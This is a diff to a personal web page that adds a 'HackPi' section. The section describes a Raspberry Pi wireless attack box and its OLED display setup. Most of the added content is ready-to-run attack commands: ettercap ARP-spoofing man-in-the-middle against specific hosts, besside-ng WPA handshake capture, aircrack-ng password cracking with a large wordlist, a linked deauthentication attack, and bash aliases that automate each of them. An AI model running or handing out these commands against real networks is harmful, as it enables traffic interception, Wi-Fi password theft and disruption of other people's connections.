@@ -46,6 +46,7 @@
                 <li><a href="#converter">Converter</a></li>
                 <li><a href="#quiz-container">Subnet quiz</a></li>
                 <li><a href="#scripts">scripts</a></li>
+                <li><a href="#hackpi">hackpi</a></li>
                 <li><a href="#kalipi">kalipi</a></li>
             </ul>
             <br>
@@ -253,6 +254,120 @@ There's nothing here yet :(
             <br>
             <br>
             <br>
+            <!-- Section for HackPi Project -->
+<p id="hackpi"><img src="images/coin.gif" alt="Skull"> <strong>HackPi (Wireless Attack Box)</strong> <img src="images/coin.gif" alt="Skull"></p>
+
+<ul>
+  <li><em>A Raspberry Pi project for hacking wireless networks</em></li>
+  <li><em>Built on Debian GNU/Linux 11 (Bullseye)</em></li>
+</ul>
+
+<div class="script-box">
+  <pre>
+⚙️ HackPi Hardware
+-------------------------------------
+- Raspberry Pi 3B
+- Alfa USB NIC
+- Waveshare 1.3" OLED (SPI)
+- Anker 10,000mAh battery bank
+
+📦 Installed Software
+-------------------------------------
+git, wireshark, nmap, ettercap-text-only,
+xrdp, sublime-text, aircrack-ng, airgeddon
+
+💻 Message of the Day
+-------------------------------------
+ /$$                           /$$                 /$$
+| $$                          | $$                |__/
+| $$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$  /$$
+| $$__  $$ |____  $$ /$$_____/| $$  /$$/ /$$__  $$| $$
+| $$  \ $$  /$$$$$$$| $$      | $$$$$$/ | $$  \ $$| $$
+| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$  | $$| $$
+| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$$$$$$/| $$
+|__/  |__/ \_______/ \_______/|__/  \__/| $$____/ |__/
+                                        | $$
+                                        | $$
+                                        |__/
+
+ViriditasNoctis
+AUTO-H#CKS:
+------------------------------------------------------------
+auto-wlan-scan      # airodump-ng wlan1
+auto-wlan-crack     # besside-ng wlan1
+auto-deauth         # wifi-deauth-rpi-wardrive/attack.py
+auto-wpa-crack      # aircrack-ng ~/SecLists/
+
+hack responsibly  /|\ ^._.^ /|\
+  </pre>
+</div>
+<br>
+<br>
+<p><strong>PiDisplay setup:</strong> OLED screen setup on Raspberry Pi</p>
+<div class="script-box"><pre>
+sudo apt-get update
+sudo apt-get install python3-dev python3-pip libffi-dev libssl-dev
+sudo pip3 install --upgrade pip
+sudo pip3 install --upgrade luma.oled
+sudo pip3 install smbus
+sudo apt-get install python3-numpy libopenjp2-7 libtiff5
+
+# Enable SPI and I2C interfaces:
+sudo raspi-config
+> Interfacing Options > SPI → Yes
+> Interfacing Options > I2C → Yes
+
+# Enable display at boot:
+sudo vi /etc/rc.local
+> Add this just above "exit 0":
+python /home/pi/monitor.py &
+</pre></div>
+<br>
+<p><strong>Attacks</strong></p>
+<div class="script-box"><pre>
+🔹 Man in the Middle
+---------------------
+Recon:
+sudo nmap -sn 10.0.10.0/24
+
+MiTM Attack:
+sudo ettercap -T -S -i wlan1 -M arp:remote /10.0.10.254// /10.0.10.92// -w dump.pcap
+
+🔹 WPA Attack
+-------------
+airodump-ng wlan1
+besside-ng wlan1 -c 11 -b 74:83:C2:91:B3:01
+
+# Tips:
+- Use aircrack-ng v1.5.2
+- Hold version to prevent bad packet issues:
+sudo apt-mark hold aircrack-ng
+
+🔹 Crack Captured Handshake
+----------------------------
+aircrack-ng wpa.cap -w ~/passwordlist.txt
+
+🔹 Deauth Bomb (follow guide)
+------------------------------
+https://github.com/ShlomiRex/wifi-deauth-rpi-wardrive
+</pre></div>
+<br>
+<p><strong>Bash Aliases</strong></p>
+<div class="script-box"><pre>
+alias auto-wlan-crack='sudo besside-ng wlan1'
+alias auto-deauth='sudo python3 /home/rowadmin/attacks/wifi-deauth-rpi-wardrive/attack.py'
+alias auto-wlan-scan='sudo airodump-ng wlan1'
+alias auto-wpa-crack='sudo aircrack-ng wpa.cap -w ~/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt'
+</pre></div>
+
+<p><strong>Sources</strong></p>
+<ul>
+  <li>OLED Display: <a href="https://github.com/pangduckwai/PiDisplay">PiDisplay GitHub</a></li>
+  <li>Deauth attack: <a href="https://github.com/ShlomiRex/wifi-deauth-rpi-wardrive">wifi-deauth GitHub</a></li>
+</ul>
+
+<br><br>
+
             <br>
             <br>
             <br>
